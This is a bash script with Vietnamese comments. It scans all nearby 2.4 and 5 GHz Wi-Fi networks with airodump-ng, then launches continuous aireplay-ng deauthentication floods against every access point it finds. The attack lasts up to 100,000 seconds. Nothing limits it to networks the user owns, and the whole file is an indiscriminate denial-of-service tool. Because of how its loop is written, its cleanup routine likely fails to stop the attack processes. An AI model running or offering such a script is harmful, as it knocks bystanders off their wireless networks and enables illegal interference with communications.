#!/bin/bash

# Cấu hình
INTERFACE="wlan1" 
MONITOR_INTERFACE="${INTERFACE}mon"
DURATION=100000
SCAN_TIME=20
CSV_FILE="/tmp/scan-01.csv"

# Hàm dọn dẹ
cleanup() {
    echo "[DEBUG] Dừng tất cả tiến trình và khôi phục hệ thống..."
    for pid in $pids; do
        kill -9 "$pid" 2>/dev/null
    done
    sleep 1
    echo "[DEBUG] Tắt monitor mode cho $MONITOR_INTERFACE..."
    airmon-ng stop "$MONITOR_INTERFACE"
    echo "[DEBUG] Khởi động lại NetworkManager..."
    service NetworkManager restart
    echo "[DEBUG] Xóa file tạm..."
    rm -f /tmp/scan-01.*
    echo "Hoàn tất!"
    exit 0
}

trap cleanup SIGINT SIGTERM

# Kiểm tra quyền root
if [[ $EUID -ne 0 ]]; then
   echo "[ERROR] Vui lòng chạy script với quyền root (sudo)."
   exit 1
fi

# Dừng các tiến trình xung đột
echo "[DEBUG] Dừng các tiến trình xung đột..."
airmon-ng check kill

# Chuyển sang monitor mode
echo "[DEBUG] Chuyển $INTERFACE sang monitor mode..."
airmon-ng start "$INTERFACE"
if ! iwconfig 2>&1 | grep -q "$MONITOR_INTERFACE"; then
    echo "[ERROR] Không thể chuyển sang monitor mode. Kiểm tra card mạng."
    cleanup
fi

# Quét mạng Wi-Fi
echo "[DEBUG] Quét mạng Wi-Fi trong $SCAN_TIME giây (bao gồm 2.4 GHz và 5 GHz)..."
timeout "$SCAN_TIME" airodump-ng "$MONITOR_INTERFACE" --band abg -w /tmp/scan --output-format csv &
wait $!
echo "[DEBUG] Quét hoàn tất."

# Kiểm tra file CSV
if [[ ! -f "$CSV_FILE" ]]; then
    echo "[ERROR] Không tìm thấy file $CSV_FILE. Quét thất bại."
    cleanup
fi
echo "[DEBUG] File CSV: $CSV_FILE đã được tạo."

# Lọc và đếm số AP
ap_count=$(grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | wc -l)
if [[ $ap_count -eq 0 ]]; then
    echo "[ERROR] File $CSV_FILE không chứa dữ liệu AP."
    cleanup
fi
echo "[DEBUG] Tìm thấy $ap_count mạng Wi-Fi."

# Đọc danh sách AP và tấn công tuần tự
echo "[DEBUG] Bắt đầu tấn công tất cả mạng Wi-Fi... (Nhấn 'q' để dừng)"
pids=""
grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | while IFS=, read -r bssid time1 time2 channel speed privacy cipher auth power beacons iv lan idlength essid key; do
    bssid=$(echo "$bssid" | tr -d ' ')
    channel=$(echo "$channel" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^[[:space:]]*//')

    # Kiểm tra dữ liệu hợp lệ (mở rộng cho 5 GHz: kênh 1-165)
    if [[ -z "$bssid" || ! "$bssid" =~ ^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$ ]]; then
        echo "[WARNING] BSSID không hợp lệ: $bssid"
        continue
    fi
    if [[ -z "$channel" || ! "$channel" =~ ^[0-9]+$ || $channel -lt 1 || $channel -gt 165 ]]; then
        echo "[WARNING] Channel không hợp lệ: $channel (BSSID: $bssid, ESSID: $essid)"
        continue
    fi
    if [[ -z "$essid" ]]; then
        essid="(Hidden SSID)"
    fi

    echo "[DEBUG] Tấn công \"$essid\" (BSSID: $bssid, Channel: $channel)"
    # Chuyển kênh bằng iw trên giao diện monitor
    iw dev "$MONITOR_INTERFACE" set channel "$channel" || {
        echo "[ERROR] Không thể chuyển sang kênh $channel cho $bssid (có thể driver không hỗ trợ)"
        # Nếu không chuyển được kênh, thử chạy aireplay-ng trên kênh hiện tại
        aireplay-ng --deauth 0 -a "$bssid" "$MONITOR_INTERFACE" &
        pid=$!
        pids="$pids $pid"
        sleep 2
        continue
    }
    aireplay-ng --deauth 0 -a "$bssid" "$MONITOR_INTERFACE" &
    pid=$!
    pids="$pids $pid"
    sleep 2  # Đợi 2 giây trước khi tấn công AP tiếp theo
done

# Chờ và dừng sau 100 giây hoặc khi nhấn 'q'
echo "[DEBUG] Đang tấn công trong $DURATION giây... (Nhấn 'q' để dừng sớm)"
for ((i=0; i<$DURATION; i++)); do
    read -t 1 -n 1 key
    if [[ "$key" == "q" ]]; then
        echo "[DEBUG] Người dùng yêu cầu dừng sớm."
        cleanup
    fi
done

# Dừng tấn công sau 100 giây
echo "[DEBUG] Thời gian tấn công kết thúc."
cleanup
